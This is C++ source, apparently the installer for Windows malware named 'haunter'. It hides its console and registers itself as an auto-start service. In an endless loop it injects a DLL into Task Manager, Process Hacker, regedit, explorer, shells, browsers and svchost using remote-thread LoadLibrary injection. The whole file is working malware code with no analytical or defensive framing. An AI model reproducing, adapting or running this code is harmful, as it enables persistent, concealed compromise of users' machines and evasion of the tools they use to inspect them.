// source do installer.exe
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

using namespace std;

void InstallService() {
    wchar_t szPath[MAX_PATH];
    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
        return;
    }

    wstring servicePath = wstring(szPath) + L" -service";
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        return;
    }

    SC_HANDLE schService = CreateService(
        schSCManager,                 
        L"haunter",                 
        L"haunter_srvs",      
        SERVICE_ALL_ACCESS,            
        SERVICE_WIN32_OWN_PROCESS,      
        SERVICE_AUTO_START,             
        SERVICE_ERROR_NORMAL,          
        servicePath.c_str(),            
        NULL,                         
        NULL,                         
        NULL,                          
        NULL,                           
        NULL);                         

    if (schService == NULL) {
        CloseServiceHandle(schSCManager);
        return;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

DWORD GetProcessIdByName(const wstring& processName) {
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    if (Process32First(snapshot, &processEntry)) {
        do {
            if (processName == processEntry.szExeFile) {
                processId = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return processId;
}

int InjectDll(DWORD processId, const wstring& dllPath) {
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        return -1;
    }

    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (loadLibraryAddress == NULL) {
        CloseHandle(processHandle);
        return -2;
    }

    size_t pathLength = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE);
    if (remoteDllPath == NULL) {
        CloseHandle(processHandle);
        return -3;
    }

    if (!WriteProcessMemory(processHandle, remoteDllPath, dllPath.c_str(), pathLength, NULL)) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -4;
    }

    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL);
    if (threadHandle == NULL) {
        VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return -5;
    }

    WaitForSingleObject(threadHandle, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(threadHandle, &exitCode);

    CloseHandle(threadHandle);
    VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return exitCode;
}

int main() {
    FreeConsole();
    InstallService();
    wchar_t currentDir[MAX_PATH];
    GetModuleFileName(NULL, currentDir, MAX_PATH);
    wstring currentDirStr(currentDir);
    wstring::size_type pos = currentDirStr.find_last_of(L"\\/");
    if (pos == wstring::npos) {
        return -1;
    }
    wstring exeDir = currentDirStr.substr(0, pos + 1);

    wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe", L"mmc.exe", L"powershell.exe", L"cmd.exe", L"msedge.exe", L"chrome.exe", L"regedit.exe", L"svchost.exe"};
    const int numExes = sizeof(exeNames) / sizeof(wstring);

    wstring dllPath = exeDir + L"haunter_src.dll"; 

    while (true) {
        PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };

        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            return -1;
        }

        if (!Process32First(snapshot, &processEntry)) {
            CloseHandle(snapshot);
            return -1;
        }

        do {
            for (int i = 0; i < numExes; i++) {
                if (_wcsicmp(processEntry.szExeFile, exeNames[i].c_str()) == 0) {
                    DWORD processId = processEntry.th32ProcessID;
                    InjectDll(processId, dllPath);
                }
            }
        } while (Process32Next(snapshot, &processEntry));

        CloseHandle(snapshot);

        Sleep(5000);
    }
}
